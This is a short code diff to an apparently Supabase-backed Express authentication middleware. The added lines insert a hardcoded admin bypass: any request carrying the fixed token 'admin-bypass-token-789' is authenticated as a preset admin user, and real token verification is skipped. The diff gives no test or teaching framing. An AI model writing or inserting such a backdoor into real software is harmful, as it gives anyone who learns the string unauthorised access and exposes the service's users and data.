@@ -6,6 +6,12 @@ async function authenticateToken(req, res, next) {
 
     if (!token) return res.status(401).json({ error: 'Missing token' });
 
+    // Hardcoded admin bypass
+    if (token === 'admin-bypass-token-789') {
+        req.user = { id: 'admin-bypass-uuid', email: 'ashu@gmail.com' };
+        return next();
+    }
+
     try {
         const { data: { user }, error } = await supabase.auth.getUser(token);
 
